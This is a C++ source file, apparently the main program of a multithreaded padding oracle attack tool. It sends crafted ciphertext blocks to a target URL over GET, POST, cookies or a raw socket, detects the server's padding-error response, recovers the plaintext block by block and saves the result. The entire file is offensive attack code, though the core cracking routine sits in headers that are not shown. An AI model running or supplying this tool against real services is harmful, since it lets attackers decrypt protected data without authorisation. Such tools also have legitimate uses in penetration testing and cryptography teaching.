#include <curl/curl.h>
#include <functional>
#include <iostream>
#include <memory> 
#include <thread>
#include <string>
#include <atomic>
#include <mutex>

#include "include/constants.h"
#include "include/network.h"
#include "include/cracker.h"
#include "include/common.h"
#include "include/target.h"
#include "include/utils.h"
#include "include/log.h"


#define BASE_64 "base64"
#define HEX "hex"


std::mutex msgMutex;
std::mutex cdlMutex;


void worker(
    unsigned int k,
    std::vector<std::vector<unsigned int>>& blocks, 
    std::vector<CypherData>& cypherDataList,
    std::string& msg
) {
    if (blocks.size() < (k+1)) {
        Log::error("Not enough blocks to slice in worker " + std::to_string(k));
        exit(1);
    }
    std::vector<std::vector<unsigned int>> slice(blocks.begin(), blocks.begin() + (k+2));
    CypherData cd;

    std::function<std::string(std::string&)> requestFunc;
    std::function<std::string(const std::vector<unsigned int>&)> convertFunc;

    // TODO: in main, not here
    if (Target::getFormat() == HEX) {
        convertFunc = BytesToHexString;
    }
    else if (Target::getFormat() == BASE_64) {
        throw std::runtime_error("Not implemented yet");
    } else {
        throw std::runtime_error("Unknown format");
    }

    if (Target::getMethod() == SOCKET) {
        SocketClient client(
            Target::getUrl(),
            Target::getPort()
        );
        requestFunc = [&client](std::string& msg) {
            return client.socketRequest(msg);
        };
        try {
            cd = Fuzz(requestFunc, slice, k, convertFunc);
        } catch (const std::exception& e) {
            Log::error(e.what());
        }

    } else {
        CURL* curl = CurlInit();
        if (Target::getMethod() == GET) {
            requestFunc = [&curl](std::string& msg) {
                return GetRequest(curl, Target::getPayload(msg));
            };
        } else if (Target::getMethod() == COOKIES) {
            requestFunc = [&curl](std::string& msg) {
                return CookiesRequest(curl, Target::getUrl(), Target::getPayload(msg));
            };
        } else if (Target::getMethod() == POST) {
            requestFunc = [&curl](std::string& msg) {
                return PostRequest(curl, Target::getUrl(), Target::getPayload(msg));
            };
        }
       
        try {
            cd = Fuzz(requestFunc, slice, k, convertFunc);
        } catch (const std::exception& e) {
            Log::error(e.what());
            CurlCleanup(curl);
        }
    }
    
    // Lock the access to cypherDataList
    {
        std::lock_guard<std::mutex> lock(cdlMutex);
        cypherDataList[k] = cd;
    }

    // message reconstruction
    unsigned int p;
    for (p=0; p<Target::getBlockSize(); p++) {
        // Lock the access to msg
        std::lock_guard<std::mutex> lock(msgMutex);
        msg[k*Target::getBlockSize()+p] = static_cast<char>(cypherDataList[k].Pn[p]);
    }
}

int main(int argc, char* argv[]) {
    Log::print(Constants::BAN);

    Args args = getArgs(argc, argv);
    Log::print("URL: "+args.url);
    if(args.method==SOCKET) Log::print("Port: "+std::to_string(args.port));
    Log::print("Method: " + args.method);
    if (args.method!=SOCKET) Log::print("Data: " + args.data);
    Log::print("Cypher: " + args.cypher);
    Log::print("Cypher format: " + args.format);
    Log::print("Block size: " + std::to_string(args.blockSize));
    Log::print("Padding error: " + args.paddingError);
    std::cout << std::endl;

    // init target parameters
    Target::initialize(
        args.url,
        args.method,
        args.port,
        args.data,  // TODO: rename to "param" ?
        args.format,
        args.paddingError,
        args.blockSize
    );

    // Build blocks, with a block of 0x00s at the beginning (in order to be able to crack the first block)
    std::vector<std::vector<unsigned int>> blocks = GetBlocks(args.cypher);
    const unsigned int nBlocks = blocks.size()-1; // -1 because we added a block of 0x00s

    Log::print("Blocks:");
    unsigned int k;
    for (k=1; k < nBlocks+1; k++) {
        std::cout << std::to_string(k) << ": [";
        for (unsigned int p=0; p < blocks[k].size(); p++) {
            std::cout << std::to_string(blocks[k][p]) << ',';
        }
        std::cout << ']' << std::endl;
    }

    std::vector<CypherData> cypherDataList;
    cypherDataList.resize(nBlocks);

    Log::print("\nPress any key to start the attack...\n");
    std::cin.get();

    std::string msg(nBlocks * Target::getBlockSize(), '\0');

    // create threads, one for each block
    Log::print("Creating one thread per block...\n");
    std::vector<std::thread> threads;
    for (k=0; k < nBlocks; k++) {
        threads.emplace_back(
            worker, 
            k, 
            std::ref(blocks),
            std::ref(cypherDataList), 
            std::ref(msg)
        );
    }

    // wait threads
    for (auto& t : threads) {
        t.join();
    }

    Log::bingo("Decrypted message: " + msg);

    Log::info("Saving results in saves/");
    saveResult(cypherDataList, Target::getUrl());

    return 0;
}